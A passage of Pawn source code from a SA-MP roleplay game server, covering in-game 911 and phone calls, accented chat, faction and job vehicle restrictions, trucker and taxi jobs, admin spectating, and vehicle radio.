			RemovePlayerAttachedObject(playerid, 9);
			return 0;
		}
		if(Mobile[playerid] == 913)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry, I don't understand?");
				return 0;
			}
			if(strcmp("no", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: We have alerted all units in the area.");
				SendClientMessage(playerid, COLOR_DBLUE, "Thank you for reporting this crime.");
				new
					szZone[MAX_ZONE_NAME];

				GetPlayer2DZone(playerid, szZone, MAX_ZONE_NAME);
				format(string, sizeof(string), "HQ: All Units APB: Reporter: %s (in %s)",GetPlayerNameEx(playerid), szZone);
				SendFamilyMessage(1, COLOR_DBLUE, string);
				SendFamilyMessage(2, COLOR_DBLUE, string);
				format(string, sizeof(string), "HQ: Crime: %s, Suspect: Unknown",PlayerCrime[playerid][pAccusing]);
				SendFamilyMessage(1, COLOR_DBLUE, string);
				SendFamilyMessage(2, COLOR_DBLUE, string);
				CalledCops[playerid] = 1;
				CopsCallTime[playerid] = 60;
				ShowPlayerBeaconForCops(playerid);
				SendClientMessage(playerid, COLOR_GRAD2, "   They hung up...");
				Mobile[playerid] = INVALID_PLAYER_ID;

				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
				RemovePlayerAttachedObject(playerid, 9);
				return 0;
			}
			new badguy = ReturnUser(text);
			if(IsPlayerConnected(badguy))
			{
				if(badguy != INVALID_PLAYER_ID)
				{
					if(PlayerInfo[badguy][pWantedLevel] > 0)
					{
						SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: Units are already assigned to that case...");
						SendClientMessage(playerid, COLOR_DBLUE, "Thank you for reporting this crime.");
						SendClientMessage(playerid, COLOR_GRAD2, "   They hung up...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 0;
					}
					if(badguy == playerid)
					{
						SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: Don't fool around. This is an emergency line.");
						SendClientMessage(playerid, COLOR_GRAD2, "   They hung up...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 0;
					}
					SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: We have alerted all units in the area.");
					SendClientMessage(playerid, COLOR_DBLUE, "Thank you for reporting this crime.");
					new
						szZone[MAX_ZONE_NAME];

					GetPlayer2DZone(playerid, szZone, MAX_ZONE_NAME);
					format(string, sizeof(string), "HQ: All Units APB: Reporter: %s (in %s)",GetPlayerNameEx(playerid), szZone);
					SendFamilyMessage(1, COLOR_DBLUE, string);
					SendFamilyMessage(2, COLOR_DBLUE, string);
					format(string, sizeof(string), "HQ: Crime: %s, Suspect: %s",PlayerCrime[playerid][pAccusing], GetPlayerNameEx(badguy));
					SendFamilyMessage(1, COLOR_DBLUE, string);
					SendFamilyMessage(2, COLOR_DBLUE, string);
					CalledCops[playerid] = 1;
					CopsCallTime[playerid] = 60;
					ShowPlayerBeaconForCops(playerid);
					SendClientMessage(playerid, COLOR_GRAD2, "   They hung up...");
					Mobile[playerid] = INVALID_PLAYER_ID;

					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
					RemovePlayerAttachedObject(playerid, 9);
					return 0;
				}
				return 0;
			}
			else
			{
				format(string, sizeof(string), "Police HQ: I have no information on %s, are you sure that's the correct name?",text);
				SendClientMessage(playerid, COLOR_DBLUE, string);
				return 0;
			}
		}
		if(Mobile[playerid] == 912)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry, I don't understand?");
				return 0;
			}
			strmid(PlayerCrime[playerid][pAccusing], text, 0, strlen(text), 255);
			SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: If you know the assailant's name or part of it say it now or just say no.");
			Mobile[playerid] = 913;
			return 0;
		}
		if(Mobile[playerid] == 911)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry, I don't understand - police or paramedic?");
				return 0;
			}
			else if(strcmp("police", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: I am patching you to police headquarters, please hold...");
				Mobile[playerid] = 912;
				SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: Please give me a short description of the crime.");
				return 0;
			}
			else if(strcmp("paramedic", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: I am patching you to LSFMD headquarters, please hold...");
				Mobile[playerid] = 914;
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Dispatch: Please give me a short description of the incident.");
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry, I don't understand - police or paramedic?");
				return 0;
			}
		}
		if(IsPlayerConnected(Mobile[playerid]))
		{
			if(Mobile[Mobile[playerid]] == playerid)
			{
				if(SpeakerPhone[playerid] != 0)
				{
				    format(string, sizeof(string), "(speakerphone) %s says: %s", GetPlayerNameEx(playerid), text);
					ProxDetector(20.0, Mobile[playerid], string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				}
				else
				{
				    SendClientMessage(Mobile[playerid], COLOR_YELLOW, string);
				}
				if(PlayerInfo[playerid][pBugged] == 1)
				{
					format(string, sizeof(string), "(bug) %s (cellphone): %s", GetPlayerNameEx(playerid), text);
					SendBugMessage(2, COLOR_LIGHTGREEN, string);
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "There's nobody there!");
			CellTime[playerid] = 0;
			SendClientMessage(playerid,  COLOR_GRAD2, "   You hung up.");
			format(string, sizeof(string), "* %s puts away their cellphone.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			Mobile[playerid] = INVALID_PLAYER_ID;
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			RemovePlayerAttachedObject(playerid, 9);
		}
		return 0;
	}

	sendername = GetPlayerNameEx(playerid);

	switch(PlayerInfo[playerid][pAccent])
	{
		case 0, 1: format(string, sizeof(string), "%s says: %s", sendername, text);
		case 2: format(string, sizeof(string), "(British accent) %s says: %s", sendername, text);
		case 3: format(string, sizeof(string), "(Asian accent) %s says: %s", sendername, text);
		case 4: format(string, sizeof(string), "(Scottish accent) %s says: %s", sendername, text);
		case 5: format(string, sizeof(string), "(Irish accent) %s says: %s", sendername, text);
		case 6: format(string, sizeof(string), "(Russian accent) %s says: %s", sendername, text);
		case 7: format(string, sizeof(string), "(American accent) %s says: %s", sendername, text);
		case 8: format(string, sizeof(string), "(Spanish accent) %s says: %s", sendername, text);
		case 9: format(string, sizeof(string), "(Southern Accent) %s says: %s", sendername, text);
		case 10: format(string, sizeof(string), "(Cuban accent) %s says: %s", sendername, text);
		case 11: format(string, sizeof(string), "(Italian accent) %s says: %s", sendername, text);
		case 12: format(string, sizeof(string), "(Gangster accent) %s says: %s", sendername, text);
		case 13: format(string, sizeof(string), "(Australian accent) %s says: %s", sendername, text);
		case 14: format(string, sizeof(string), "(Arabic accent) %s says: %s", sendername, text);
		case 15: format(string, sizeof(string), "(Balkan accent) %s says: %s", sendername, text);
		case 16: format(string, sizeof(string), "(Canadian accent) %s says: %s", sendername, text);
		case 17: format(string, sizeof(string), "(Jamaican accent) %s says: %s", sendername, text);
		case 18: format(string, sizeof(string), "(Israeli accent) %s says: %s", sendername, text);
		case 19: format(string, sizeof(string), "(Indian accent) %s says: %s", sendername, text);
		case 20: format(string, sizeof(string), "(Welsh accent) %s says: %s", sendername, text);
		case 21: format(string, sizeof(string), "(French accent) %s says: %s", sendername, text);
		case 22:format(string, sizeof(string), "(German accent) %s says: %s", sendername, text);
		case 23: format(string, sizeof(string), "(Dutch accent) %s says: %s", sendername, text);
		case 24: format(string, sizeof(string), "(South African accent) %s says: %s", sendername, text);
		case 25: format(string, sizeof(string), "%s says: %s", sendername, text);
	}
	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAccent] != 25) {
		format(string, sizeof(string), "%s says: (( %s )) ", sendername, text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		SetPlayerChatBubble(playerid, text, COLOR_WHITE, 20.0, 5000);
	} else {
		if(IsPlayerInAnyVehicle(playerid) && IsVehicleWindowsDown[vehicleid] == 1) { //Windows closed.
			format(string, sizeof(string), "[Windows Closed] %s says: %s", sendername, text);
			ProxDetector(3.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		} else {
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			SetPlayerChatBubble(playerid,text,COLOR_WHITE,20.0,5000);
		}
		if(PlayerInfo[playerid][pBugged] == 1 && AdminDuty[playerid] == 0) {
			format(string, sizeof(string), "(bug) %s: %s", GetPlayerNameEx(playerid), text);
			SendBugMessage(2, COLOR_LIGHTGREEN, string);
		}
	}
	return 0;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger) {
	if(PlayerCuffed[playerid] != 0)
		SetPVarInt(playerid, "ToBeEjected", 1);

	if(GetPVarInt(playerid, "Injured") == 1)
		SetPVarInt(playerid, "ToBeEjected", 1);

	SetPVarInt(playerid, "LastWeapon", GetPlayerWeapon(playerid));

	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);

    if(GetPVarInt(playerid, "Pizza") != 0 && !(IsAPizzaCar(vehicleid))) {
	    new Float:slx, Float:sly, Float:slz;
		GetPlayerPos(playerid, slx, sly, slz);
		SetPlayerPos(playerid, slx, sly, slz+1.3);
		PlayerPlaySound(playerid, 1130, slx, sly, slz+1.3);
		RemovePlayerFromVehicle(playerid);
		NOPCheck(playerid);
		SendClientMessage(playerid, COLOR_GRAD2, "You need to be in a Pizza Boy when delivering pizzas!");
		return 1;
	}

	if(!ispassenger)
	{
	    SetPlayerArmedWeapon(playerid, 0);

   		if(GetChased[playerid] < 999 && VehicleBomb{vehicleid} == 1)
		{
			if(PlayerInfo[playerid][pHeadValue] >= 1)
			{
				if(PlayerInfo[GetChased[playerid]][pFaction] == 4 || PlayerInfo[GetChased[playerid]][pLeader] == 4)
				{
   					VehicleBomb{vehicleid} = 0;
				    SetTimerEx("VehicleBombDelay", 5000, 0, "d", playerid);
					return 1;
				}
			}
		}

   		if(IsACopCar(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the LSPD!");
			}
		}
		else if(IsAFBICar(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the FBI!");
			}
		}
	    else if(IsAPizzaCar(vehicleid)) {
		    if(PlayerInfo[playerid][pJob] != 21 && PlayerInfo[playerid][pJob2] != 21) {
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.3);
				PlayerPlaySound(playerid, 1130, slx, sly, slz+1.3);
			    RemovePlayerFromVehicle(playerid);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not a Pizza Boy!");
			}
		}
		else if(IsAnAmbulance(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3) {
			    if(LSFMDVehicles[13] == vehicleid && PlayerInfo[playerid][pRank] < 5) {
			        RemovePlayerFromVehicle(playerid);
			        new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
			        NOPCheck(playerid);
					SendClientMessage(playerid, COLOR_GRAD2, "Only ranks 5+ can drive this vehicle.");
			    }
			}
		    else
			{
			    SendClientMessage(playerid,COLOR_GREY,"   You're not in the LSFMD!");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
				NOPCheck(playerid);
			}
		}
		else if(IsANewsVeh(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 9 && PlayerInfo[playerid][pLeader] != 9) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the San Andreas News faction!");
			} else if(GetVehicleModel(vehicleid) == 488 && PlayerInfo[playerid][pRank] < 3) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You must be Rank 3 or higher to pilot this helicopter.");
			}
		}
		/*else if(IsAGovCar(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pLeader] != 5) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the Government!");
			}
		}*/
 		else if(IsAPlane(vehicleid)) {
	  		if(PlayerInfo[playerid][pFlyLic] != 1) {
		  		RemovePlayerFromVehicle(playerid);
		  		new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		  		NOPCheck(playerid);
			 	SendClientMessage(playerid,COLOR_GREY,"You don't have a pilot license!");
	  		}
		}
		else if(IsAHelicopter(vehicleid)) {
		    if(LSFMDVehicles[38] == vehicleid || LSFMDVehicles[39] == vehicleid || LSFMDVehicles[40] == vehicleid) {
		    	if(PlayerInfo[playerid][pFaction] != 3 || PlayerInfo[playerid][pDivision] != 2) {
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
				  	NOPCheck(playerid);
					SendClientMessage(playerid,COLOR_GREY,"This vehicle is restricted to the LF division.");
				}
			}

		    PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
			GivePlayerValidWeapon(playerid, 46, 60000);
		}
		else if(IsATruckerCar(vehicleid)) {
		    if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20) {
				new string[128];

				new truckcontents = TruckContents[vehicleid];
				new truckcontentname[50];
				if(truckcontents == 0)
				{ format(truckcontentname, sizeof(truckcontentname), "None"); }
				else if(truckcontents >= 1 && truckcontents <= 3)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Food & beverages");}
				else if(truckcontents >= 4 && truckcontents <= 6)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Clothing"); }
				else if(truckcontents == 7)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Legal materials"); }
				else if(truckcontents >= 8 && truckcontents <= 10)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}24/7 items"); }
				else if(truckcontents >= 11 && truckcontents <= 15)
				{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal weapons"); }
				else if(truckcontents >= 16 && truckcontents <= 20)
				{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal drugs"); }
				else if(truckcontents >= 21 && truckcontents <= 25)
				{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal materials"); }

				format(string, sizeof(string), "TRUCKER JOB: (Truck registration: %s %d) - (Content: %s{FFFF00})", GetVehicleName(vehicleid), vehicleid, truckcontentname);
				SendClientMessage(playerid, COLOR_YELLOW, string);

				if(IsACop(playerid) && truckcontents >= 11)
				{
					SendClientMessage(playerid, COLOR_YELLOW, "TRUCKER JOB: To remove the illegal goods type /cleartruck near the Truck.");
				}
				if(truckcontents > 0 && TruckUsed[playerid] == INVALID_VEHICLE_ID)
				{
					SendClientMessage(playerid, COLOR_YELLOW, "TRUCKER JOB: To deliver the goods type /hijacktruck as the driver.");
				}
				else if(TruckUsed[playerid] == INVALID_VEHICLE_ID)
				{
    				SendClientMessage(playerid, COLOR_YELLOW, "TRUCKER JOB: To get goods type /loadtruck as the driver.");
				}
				else if(TruckUsed[playerid] == vehicleid && gPlayerCheckpointStatus[playerid] == CHECKPOINT_RETURNTRUCK)
				{
					SendClientMessage(playerid, COLOR_YELLOW, "TRUCKER JOB: This is your Truck, you have not returned it to the docks yet for your pay.");
				}
				else if(TruckUsed[playerid] == vehicleid)
   				{
      				SendClientMessage(playerid, COLOR_YELLOW, "TRUCKER JOB: This is your Truck, you have not delivered your goods yet.");
     			}
				else if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
   				{
      				SendClientMessage(playerid, COLOR_YELLOW, "TRUCKER JOB: you're already on another delivery, type /cancel truck to cancel that delivery.");
     			}
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not a Trucker!");
			}
		}
		else if(IsAnTaxi(vehicleid) || IsAnBus(vehicleid)) {
	        if(PlayerInfo[playerid][pJob] != 17 && PlayerInfo[playerid][pJob2] != 17) {
		        SendClientMessage(playerid,COLOR_GREY,"   You're not a Taxi/Bus Driver!");
		        RemovePlayerFromVehicle(playerid);
		        new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		    }
		}
	}
	else if(!IsPlayerInRangeOfVehicle(playerid, vehicleid, 7.5) || LockStatus[vehicleid] >= 1) { // G-bugging fix
		ClearAnimations(playerid, 1);
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid) {
	if(GetPlayerState(playerid) == 1)
		return 1;

	if(GetPVarInt(playerid, "rccam") == 1)
	{
		DestroyVehicle(GetPVarInt(playerid, "rcveh"));
		VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
	    SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
		DeletePVar(playerid, "rccam");
	    KillTimer(GetPVarInt(playerid, "rccamtimer"));
	}
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate) {
	if(GettingSpectated[playerid] != 999)
	{
	    new spectator = GettingSpectated[playerid];
	    if(!IsPlayerConnected(spectator))
	    {
	        GettingSpectated[playerid] = 999;
	        Spectate[spectator] = 999;
		}

	    if(newstate == PLAYER_STATE_DRIVER && PlayerInfo[spectator][pAdmin] >= 2 || newstate == PLAYER_STATE_PASSENGER && PlayerInfo[spectator][pAdmin] >= 2)
	    {
	        TogglePlayerSpectating(spectator, true);
			new carid = GetPlayerVehicleID(playerid);
			PlayerSpectateVehicle(spectator, carid);
	    }
	    else if(newstate == PLAYER_STATE_ONFOOT && PlayerInfo[spectator][pAdmin] >= 2)
	    {
	        TogglePlayerSpectating(spectator, true);
		   	PlayerSpectatePlayer(spectator, playerid);
		   	SetPlayerInterior(spectator, GetPlayerInterior(playerid));
	    }
	}

	if((newstate == 2 || newstate == 3 || newstate == 7 || newstate == 9) && pTazer[playerid] == 1)
	{
	    RemovePlayerWeapon(playerid, 23);
		GivePlayerValidWeapon(playerid, pTazerReplace[playerid], 60000);
		pTazer[playerid] = 0;
	}

	if(newstate == PLAYER_STATE_ONFOOT)
	{
		if(MP3Station[playerid] == 0) {
			StopAudioStreamForPlayer(playerid);
		} else {
			new
				t = MP3Station[playerid]-1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);
		}

		if(GettingSpectated[playerid] < MAX_PLAYERS && PlayerInfo[GettingSpectated[playerid]][pAdmin] >= 2)
		{
			new spectator = GettingSpectated[playerid];
  			// Preventing possible buffer overflows with the arrays
			TogglePlayerSpectating(spectator, true);
			PlayerSpectatePlayer(spectator, playerid);
			SetPlayerInterior(spectator, GetPlayerInterior(playerid));
			SetPlayerInterior(spectator, GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(spectator, GetPlayerVirtualWorld(playerid));
		}
		if(ConnectedToPC[playerid] == 1337)//mdc
	    {
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now logged off the MDC.");
	        ConnectedToPC[playerid] = 0;
		}
		if(RadarActive[playerid] == 1)//mdc speed radar
	    {
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now logged off the MDC Speed Radar.");
			RadarActive[playerid] = 0;
			TextDrawDestroy(RadarTitle[playerid]);
			TextDrawDestroy(RadarContext[playerid]);
		}
        if(TransportDuty[playerid] > 0)
		{
		    if(TransportDuty[playerid] == 1)
			{
		        TaxiDrivers -= 1;
			}
			else if(TransportDuty[playerid] == 2)
			{
			    BusDrivers -= 1;
			}
			TransportDuty[playerid] = 0;
			new string[42];
			format(string, sizeof(string), "* You're now off duty and earned $%d.", TransportMoney[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, TransportMoney[playerid]);
			ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
			SetPlayerColor(playerid, TEAM_HIT_COLOR);
			TransportTime[playerid] = 0;
   			TransportCost[playerid] = 0;
		}
		if(TransportDriver[playerid] < MAX_PLAYERS && AdminDuty[playerid] == 0)
		{
			new string[128];
			TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
			format(string, sizeof(string), "~w~The ride cost~n~~r~$%d",TransportCost[playerid]);
			GameTextForPlayer(playerid, string, 5000, 3);
			format(string, sizeof(string), "~w~Passenger left the taxi.~n~~g~Earned $%d",TransportCost[playerid]);
			GameTextForPlayer(TransportDriver[playerid], string, 5000, 3);
			GivePlayerCash(playerid, -TransportCost[playerid]);

			new ip[32], ipex[32];
			GetPlayerIp(playerid, ip, sizeof(ip));
			GetPlayerIp(TransportDriver[playerid], ipex, sizeof(ipex));
			TaxiWarn[playerid][TransportDriver[playerid]] += TransportCost[playerid];
			if(TaxiWarn[playerid][TransportDriver[playerid]] >= 10000)
			{
				format(string, sizeof(string), "%s (IP:%s) has taxied %s (IP:%s) $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(TransportDriver[playerid]), ipex, TaxiWarn[playerid][TransportDriver[playerid]]);
				//Log("logs/pay.log", string);
				ABroadCast(COLOR_YELLOW, string, 1);
			}
			TransportTime[TransportDriver[playerid]] = 0;
			TransportCost[TransportDriver[playerid]] = 0;
			TransportCost[playerid] = 0;
			TransportTime[playerid] = 0;
			TransportDriver[playerid] = 999;
		}
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
	}
	if(newstate == PLAYER_STATE_WASTED)
	{
	    if(GetPVarInt(playerid, "EventToken") == 0 && AdminDuty[playerid] == 0)
	    {
			SetPVarInt(playerid, "MedicBill", 1);
		}
	}
 	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    fVehSpeed[playerid] = 0;
	    new vehicleid = GetPlayerVehicleID(playerid);
	    gLastCar[playerid] = vehicleid;

 		if(PlayerInfo[playerid][pGuns][4] > 0)	SetPlayerArmedWeapon(playerid,PlayerInfo[playerid][pGuns][4]);
		else SetPlayerArmedWeapon(playerid,0);

  		if(GetPVarInt(playerid, "ToBeEjected") >= 1)
    	{
	       	SetPVarInt(playerid, "ToBeEjected", 0);
	       	RemovePlayerFromVehicle(playerid);
	       	new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			SetPlayerPos(playerid, X, Y, Z+2);

			if(GetPVarInt(playerid, "Injured") == 1)
  			{
  			    Streamer_UpdateEx(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
		   		SetPlayerPos(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
				SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"MedicVW"));
				SetPlayerInterior(playerid, GetPVarInt(playerid,"MedicInt"));
   				ClearAnimations(playerid, 1);
				ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
   			}
   		}

		if(VehicleRadioStation[GetPlayerVehicleID(playerid)] != 0)
		{
			new getradio = VehicleRadioStation[GetPlayerVehicleID(playerid)]-1;
			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[getradio][radiourl]);
		}

  		foreach(Player, i)
	    {
     		if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == 2 && TransportDuty[i] > 0 && AdminDuty[playerid] == 0)
       		{
				if(GetPlayerCash(playerid) < TransportValue[i])
				{
					new string[128];
					format(string, sizeof(string), "* You need $%d to enter.", TransportValue[i]);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					RemovePlayerFromVehicle(playerid);
					new Float:X, Float:Y, Float:Z;
					GetPlayerPos(playerid, X, Y, Z);
					SetPlayerPos(playerid, X, Y, Z+2);
					TogglePlayerControllable(playerid, 1);
				}
				else
				{
					new string[128];
					if(TransportDuty[i] == 1 && AdminDuty[playerid] == 0)
					{
						format(string, sizeof(string), "* You paid $%d to the Taxi Driver.", TransportValue[i]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Passenger %s has entered your taxi.", GetPlayerNameEx(playerid));
						SendClientMessage(i, COLOR_LIGHTBLUE, string);
						TransportTime[i] = 1;
						TransportTime[playerid] = 1;
						TransportCost[playerid] = TransportValue[i];
						TransportCost[i] = TransportValue[i];
						TransportDriver[playerid] = i;
					}
					else if(TransportDuty[i] == 2)
					{
						format(string, sizeof(string), "* You paid $%d to the Taxi Driver.", TransportValue[i]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Passenger %s has entered your Taxi.", GetPlayerNameEx(playerid));
						SendClientMessage(i, COLOR_LIGHTBLUE, string);
					}
					GivePlayerCash(playerid, - TransportValue[i]);
					GivePlayerCash(i,TransportValue[i]);
					TransportMoney[i] += TransportValue[i];
				}
      		}
	    }
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    fVehSpeed[playerid] = 0;

	    SetPlayerArmedWeapon(playerid, 0);

	    if(VehicleRadioStation[GetPlayerVehicleID(playerid)] == 0)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "{FFA500}Vehicle radio station:{FFFFFF} None - {FFA500}Genre:{FFFFFF} None {FFA500} (Use /setradio)");
		}
   		if(VehicleRadioStation[GetPlayerVehicleID(playerid)] != 0)
		{
			new getradio = VehicleRadioStation[GetPlayerVehicleID(playerid)]-1;
			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[getradio][radiourl]);

			new genre[18];
			if(getradio >= 0 && getradio <= 9) genre = "Alternative";
			else if(getradio >= 10 && getradio <= 19) genre = "Blues";
			else if(getradio >= 20 && getradio <= 29) genre = "Classical";
			else if(getradio >= 30 && getradio <= 39) genre = "Country";
			else if(getradio >= 40 && getradio <= 49) genre = "Decades";
			else if(getradio >= 50 && getradio <= 59) genre = "Easy Listening";
			else if(getradio >= 60 && getradio <= 69) genre = "Electronic";
			else if(getradio >= 70 && getradio <= 79) genre = "Folk";
			else if(getradio >= 80 && getradio <= 89) genre = "Inspirational";
			else if(getradio >= 90 && getradio <= 99) genre = "International";
			else if(getradio >= 100 && getradio <= 109) genre = "Jazz";
			else if(getradio >= 110 && getradio <= 119) genre = "Latin";
			else if(getradio >= 120 && getradio <= 129) genre = "Metal";
			else if(getradio >= 130 && getradio <= 139) genre = "Misc";
			else if(getradio >= 140 && getradio <= 149) genre = "New Age";
			else if(getradio >= 150 && getradio <= 159) genre = "Pop";
			else if(getradio >= 160 && getradio <= 169) genre = "Public Radio";
			else if(getradio >= 170 && getradio <= 179) genre = "R&B/Urban";
			else if(getradio >= 180 && getradio <= 189) genre = "Rap";
			else if(getradio >= 190 && getradio <= 199) genre = "Reggae";
			else if(getradio >= 200 && getradio <= 209) genre = "Rock";
			else if(getradio >= 210 && getradio <= 219) genre = "Talk";

			new string[128];
			format(string, sizeof(string), "{FFA500}Vehicle radio station:{FFFFFF} %s - {FFA500}Genre:{FFFFFF} %s {FFA500} (Use /setradio)", VehicleRadioListing[getradio][radioname], genre);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}

   		new
			newcar = GetPlayerVehicleID(playerid),
			engine, lights, alarm, doors, bonnet, boot, objective, v;

        gLastCar[playerid] = newcar;

   	    if(GetPVarInt(playerid, "ToBeEjected") >= 1)
    	{
